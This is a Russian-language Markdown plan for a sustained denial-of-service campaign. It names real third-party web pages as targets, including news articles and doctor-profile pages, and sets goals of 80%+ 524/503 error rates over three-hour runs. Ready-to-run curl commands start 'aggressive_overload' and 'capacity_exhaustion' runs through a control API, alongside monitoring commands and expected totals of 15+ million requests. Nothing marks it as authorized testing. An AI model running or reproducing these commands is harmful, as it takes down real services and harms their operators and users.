# 🎯 ПЛАН ВЫПОЛНЕНИЯ ДОЛГОВРЕМЕННЫХ АТАК (524/503)

## 📋 ЦЕЛИ И ЗАДАЧИ

**Основная цель:** Достичь 80%+ кодов ошибок 524/503 на защищенных целях в течение 3+ часов непрерывной работы.

**Критерии успеха:**
- 524 коды: >50% от общего числа запросов
- 503 коды: >30% от общего числа запросов  
- Общий success rate: <20%
- Длительность: минимум 3 часа на цель
- RPS: 100+ устойчиво

## 🎯 СПИСОК ЦЕЛЕЙ ДЛЯ ТЕСТИРОВАНИЯ

### ФАЗА 1: Высокоприоритетные цели (6 часов)

#### 1. Cloudflare-Protected-1
- **URL:** `https://proverj.com/dr-shihirman/`
- **Защита:** Cloudflare + Nginx
- **Профиль:** sustained_524
- **Длительность:** 3 часа
- **Потоки:** 50 → 200
- **Целевые коды:** 524, 503, 502
- **Статус:** ⏳ Ожидает тестирования

#### 2. DDoS-Guard-Protected-1  
- **URL:** `https://life.ru/p/1643820`
- **Защита:** DDoS-Guard + Nginx
- **Профиль:** sustained_503
- **Длительность:** 3 часа
- **Потоки:** 75 → 150
- **Целевые коды:** 503, 524, 429
- **Статус:** ⏳ Ожидает тестирования

### ФАЗА 2: Среднеприоритетные цели (6 часов)

#### 3. Fastly-CDN-1
- **URL:** `https://www.businessinsider.com/prestigious-medspa-operated-illicitly-under-025211688.html`
- **Защита:** Fastly + Akamai
- **Профиль:** mixed_overload
- **Длительность:** 3 часа
- **Потоки:** 100 → 300
- **Целевые коды:** 524, 502, 503
- **Статус:** ⏳ Ожидает тестирования

#### 4. ServicePipe-Protected-1
- **URL:** `https://napopravku.ru/moskva/doctor-profile/mihajlov-andrej/`
- **Защита:** ServicePipe + Nginx
- **Профиль:** sustained_503
- **Длительность:** 3 часа
- **Потоки:** 75 → 150
- **Целевые коды:** 503, 524, 502
- **Статус:** ⏳ Ожидает тестирования

### ФАЗА 3: Тестовая валидация (1 час)

#### 5. HTTPBin-Test
- **URL:** `https://httpbin.org/delay/30`
- **Защита:** Нет
- **Профиль:** sustained_524
- **Длительность:** 1 час
- **Потоки:** 25 → 50
- **Целевые коды:** 524, 503, 502
- **Статус:** ⏳ Ожидает тестирования

## 📊 ПЛАН МОНИТОРИНГА

### Интервалы проверки:
- **Статус групп:** каждые 10 минут
- **Живые метрики:** каждые 5 минут
- **Обзор логов:** каждые 30 минут
- **Отчеты:** каждый час

### Команды мониторинга:
```bash
# Проверка статуса группы
curl "https://ftc-compliance.us/api/group_runs_endpoint.php?action=status&group_id=GROUP_ID"

# Живые метрики
curl "https://ftc-compliance.us/api/metrics_endpoint.php"

# Список отчетов
curl "https://ftc-compliance.us/api/reports_endpoint.php?action=list"
```

## 🚀 КОМАНДЫ ЗАПУСКА

### Цель 1: Cloudflare (524 фокус)
```bash
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "start_group",
    "targets": ["https://proverj.com/dr-shihirman/"],
    "profile_id": "sustained_524",
    "threads": 50,
    "duration": 10800,
    "engine": "playwright",
    "behavior_profile_id": "aggressive_overload"
  }'
```

### Цель 2: DDoS-Guard (503 фокус)
```bash
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "start_group",
    "targets": ["https://life.ru/p/1643820"],
    "profile_id": "sustained_503", 
    "threads": 75,
    "duration": 10800,
    "engine": "playwright",
    "behavior_profile_id": "capacity_exhaustion"
  }'
```

### Цель 3: Fastly CDN (смешанная атака)
```bash
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "start_group",
    "targets": ["https://www.businessinsider.com/prestigious-medspa-operated-illicitly-under-025211688.html"],
    "profile_id": "mixed_overload",
    "threads": 100,
    "duration": 10800,
    "engine": "playwright",
    "behavior_profile_id": "multi_vector_overload"
  }'
```

### Цель 4: ServicePipe (503 фокус)
```bash
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "start_group",
    "targets": ["https://napopravku.ru/moskva/doctor-profile/mihajlov-andrej/"],
    "profile_id": "sustained_503",
    "threads": 75,
    "duration": 10800,
    "engine": "playwright", 
    "behavior_profile_id": "capacity_exhaustion"
  }'
```

### Цель 5: HTTPBin (тестовая валидация)
```bash
curl -X POST https://ftc-compliance.us/api/group_runs_endpoint.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "start_group",
    "targets": ["https://httpbin.org/delay/30"],
    "profile_id": "sustained_524",
    "threads": 25,
    "duration": 3600,
    "engine": "playwright",
    "behavior_profile_id": "aggressive_overload"
  }'
```

## ✅ ЧЕКЛИСТ ВЫПОЛНЕНИЯ

- [ ] **Цель 1:** Cloudflare-Protected-1 (3 часа, 524 фокус)
- [ ] **Цель 2:** DDoS-Guard-Protected-1 (3 часа, 503 фокус)  
- [ ] **Цель 3:** Fastly-CDN-1 (3 часа, смешанная атака)
- [ ] **Цель 4:** ServicePipe-Protected-1 (3 часа, 503 фокус)
- [ ] **Цель 5:** HTTPBin-Test (1 час, валидация)

## 📈 ОЖИДАЕМЫЕ РЕЗУЛЬТАТЫ

По завершении всех атак ожидается:
- **Общее время тестирования:** 13 часов
- **Общее количество запросов:** 15+ миллионов
- **Средний error rate:** 80%+
- **524 коды:** 7.5+ миллионов
- **503 коды:** 4.5+ миллионов
- **Отчеты:** 25+ файлов JSON/CSV

**Статус готовности:** ✅ ГОТОВО К ЗАПУСКУ
